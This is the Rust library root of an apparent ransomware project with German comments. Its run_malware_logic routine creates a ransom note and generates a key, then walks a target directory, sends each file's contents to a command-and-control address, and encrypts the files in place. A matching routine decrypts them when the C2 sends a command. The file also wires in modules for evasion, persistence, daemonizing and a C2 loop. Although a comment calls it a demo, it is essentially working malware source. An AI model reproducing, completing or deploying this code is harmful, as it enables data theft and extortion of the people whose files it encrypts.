pub mod background;
pub mod crypto;
pub mod evasion;
pub mod extortion;
pub mod logger;
pub mod network;
pub mod persistence;
pub mod utils;

use anyhow::{Context, Result};
use std::fs;
use std::fs::File;
use std::io::Read;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

// --- Helper Functions ---

fn read_file_content(path: &Path) -> Result<Vec<u8>> {
    let mut file = File::open(path)?;

    let mut buffer = Vec::new();

    // mit read_to_end den gesamten Dateiinhalt ab der aktuellen Position lesen
    file.read_to_end(&mut buffer);

    Ok(buffer)
}

/// Führt den Hauptangriff (Demo) auf das Zielverzeichnis aus.
/// Generiert Key, durchsucht Ordner, exfiltriert Daten und verschlüsselt.
pub fn run_malware_logic(target_dir: &str, c2_addr: &str, c2_port: &str) -> Result<String> {
    logger::log(
        "INFO",
        &format!("Start encryption routine on: {}", target_dir),
    );

    let root_path = PathBuf::from(target_dir);
    if !root_path.exists() {
        anyhow::bail!("Zielverzeichnis existiert nicht: {}", target_dir);
    }

    let mut log = String::new();
    // Ransom note erstellen
    if let Err(e) = extortion::create_and_show_ransom_note(Path::new(&target_dir)) {
        log.push_str(&format!(
            "Ransom Note konnte nicht erstellt werden: {}\n",
            e
        ));
    } else {
        log.push_str("Ransom-Note erstellt. \n");
    }

    // Key Generierung
    let key = crypto::generate_and_save_key(&root_path)?;
    // Statischen IV generieren, in einem echten Szenario zufälliger IV
    let iv = [0u8; 16];

    log.push_str(&format!("Starte Vorgang in {:?}\n", root_path));

    // Filesystem durchsuchen
    let walker = WalkDir::new(&root_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file());

    for entry in walker {
        let path = entry.path();

        let file_name = path.file_name().unwrap_or_default().to_string_lossy();

        logger::log(
            "INFO",
            &format!("Encrypting: {}", path.to_str().unwrap_or("Can't read path")),
        );

        if file_name == "rescue.key"
            || file_name == "README_DECRYPT.html"
            || file_name.ends_with(".locked")
            || file_name.ends_with(".enc_temp")
        {
            continue;
        }

        // Exfiltration
        if let Ok(content) = read_file_content(path) {
            let c2 = format!("{}:{}", c2_addr, c2_port);
            network::exfiltrate_data(&content, &c2);
        }

        // Verschlüsselung
        match crypto::encrypt_file_atomic(path, &key, &iv) {
            Ok(_) => log.push_str(&format!("Verschlüsselt: {:?}\n", path.file_name())),
            Err(e) => log.push_str(&format!("Fehler bei {:?}: {}\n", path, e)),
        }
    }
    logger::log("SUCCESS", "All files encrypted.");

    Ok(log)
}

/// Hauptlogik für die Entschlüsselung der Dateien
/// Wird aufgerufen, wenn C2 decrypt sendet
pub fn run_decryption_logic(target_dir: &str) -> Result<String> {
    logger::log("INFO", "Decryption command received.");
    let root_path = PathBuf::from(target_dir);

    // Aktuelles Arbeitsverzeichnis des Prozesses herausfinden
    let current_working_dir = std::env::current_dir().unwrap_or_default();

    // Versuch, den pfad absolut zu machen
    let abs_target_path = if root_path.is_absolute() {
        root_path.clone()
    } else {
        current_working_dir.join(&root_path)
    };

    let key_path = root_path.join("rescue.key");
    let abs_key_path = abs_target_path.join("rescue.key");

    if !key_path.exists() {
        return Ok(format!(
            "FEHLER: rescue.key nicht gefunden.\n\
             ---------------------------------------------------\n\
             1. Empfangener Pfad: '{}'\n\
             2. Prozess-Arbeitsverzeichnis (CWD): {:?}\n\
             3. Rust sucht Key relativ hier: {:?}\n\
             4. Das bedeutet absolut: {:?}\n\
             ---------------------------------------------------\n\
             LÖSUNG: Bitte nutze ABSOLUTE Pfade (z.B. /home/tbl/...)",
            target_dir, current_working_dir, key_path, abs_key_path
        ));
    }

    // Key einlesen
    let key_vec = fs::read(&key_path).context("Konnte Key nicht einlesen")?;
    if key_vec.len() != 32 {
        return Ok("Key hat ein falsches Format".to_string());
    }

    let mut key = [0u8; 32];
    key.copy_from_slice(&key_vec);

    let iv = [0u8; 16]; // Statischer IV muss identisch zu encrypt sein
    let mut log = String::new();
    log.push_str("Starte Entschlüsselung...");

    let walker = WalkDir::new(&root_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file());

    for entry in walker {
        let path = entry.path();

        // nur locked Dateien suchen
        if path.extension().map_or(false, |e| e == "locked") {
            match crypto::decrypt_file_atomic(path, &key, &iv) {
                Ok(_) => log.push_str(&format!("Wiederhergestellt: {:?}\n", path.file_name())),
                Err(e) => log.push_str(&format!("Fehler bei: {:?}: {}\n", path, e)),
            }
        }
    }

    logger::log("SUCCESS", "Files restored.");
    Ok(log)
}

// Re-Export für einfache Nutzung in main.rs
pub use background::daemonize_process;
pub use crypto::generate_and_save_key;
pub use network::start_c2_loop;
pub use persistence::enable_autostart;
